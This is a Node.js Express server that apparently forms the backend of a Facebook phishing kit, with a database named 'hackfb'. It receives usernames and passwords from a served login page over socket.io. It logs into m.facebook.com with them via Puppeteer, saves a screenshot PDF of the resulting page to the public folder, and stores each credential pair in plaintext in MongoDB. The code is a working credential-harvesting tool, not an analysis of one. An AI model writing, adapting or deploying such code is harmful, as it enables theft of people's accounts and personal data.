const express= require('express');
const app = express();
const port = 3000;
const server = require("http").Server(app);
const puppeteer = require('puppeteer')
app.use(express.json());
app.use(express.urlencoded({ extended: false }));
app.set("views", "./views");
app.set("view engine", "ejs");
server.listen(port);
app.use(express.static("public"));

const io = require("socket.io")(server);
const mongoose = require('mongoose');

mongoose.connect(`mongodb://localhost:27017/hackfb`,{ useNewUrlParser: true ,useUnifiedTopology: true,useFindAndModify: false,})

const facebookSchema = new mongoose.Schema({
    name:String,
    password: String,
});

const facebookInfos = mongoose.model('facebookInfos', facebookSchema);

async function loginFB(username,password){
    try {
        const browser = await puppeteer.launch({headless: false});
        const page = await browser.newPage();
        await page.goto('https://m.facebook.com/');

        
        await page.type('#m_login_email', username);
        await page.type('#m_login_password', password);
        await page.click('#u_0_4');

        await page.waitFor(5000)

        await page.pdf({path: './public/vycv.pdf', format: 'A2',printBackground :true});

        await facebookInfos.create({
            name: username,
            password: password
        })

        await browser.close();        

    } catch (error) {
        console.log("Catch : " + error);
    }
}

io.on('connection',function(socket){
    socket.on('send-account',({username,password})=>{
        loginFB(username,password)
    })
})

app.get('/',(req,res)=>{
    res.render('index')
})

app.get('/login',(req,res)=>{
    res.render('login')
})